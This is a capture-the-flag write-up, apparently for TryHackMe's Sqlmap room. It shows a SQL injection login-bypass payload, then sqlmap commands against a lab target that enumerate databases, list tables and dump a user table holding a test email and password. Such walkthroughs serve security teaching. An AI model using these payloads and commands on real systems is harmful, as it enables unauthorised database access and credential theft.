# TryHackMe Writeup: Sqlmap

"Sometimes, when input is improperly sanitized, meaning that user input is not validated, attackers can manipulate the input and write SQL queries that would get executed in the database and perform the attacker’s desired actions. SQL injection has a very harmful effect in this digital world as all organizations store their data, including their critical information, inside the databases, and a successful SQL injection attack can compromise their critical data." TryHackMe

Username: John
Password: abc' OR 1=1;-- -

SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -'



## Practices

### How many databases are available in this web application?

```bash
sqlmap -u 'http://TARGET_IP/ai/includes/user_login?email=admin&password=admin' --dbs --level=5
```

```bash
# OUTPUT
[] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[] [INFO] fetching database names
[] [INFO] retrieved: 'information_schema'
[] [INFO] retrieved: 'ai'
[] [INFO] retrieved: 'mysql'
[] [INFO] retrieved: 'performance_schema'
[] [INFO] retrieved: 'phpmyadmin'
[] [INFO] retrieved: 'test'
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

```

### What is the name of the table available in the "ai" database?

```bash
sqlmap -u 'http://TARGET_IP/ai/includes/user_login?email=admin&password=admin' -D ai --tables --level=5
```

```bash
# OUTPUT
Parameter: email (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    
    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

### What is the password of the email test@chatai.com?

```bash
sqlmap -u 'http://TARGET_IP/ai/includes/user_login?email=admin&password=admin' -D ai -T user --dump --level=5
```

```bash

# OUTPUT

Database: ai
Table: user
[1 entry]
+------+-----------------+---------------------+------------+
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
+------+-----------------+---------------------+------------+

```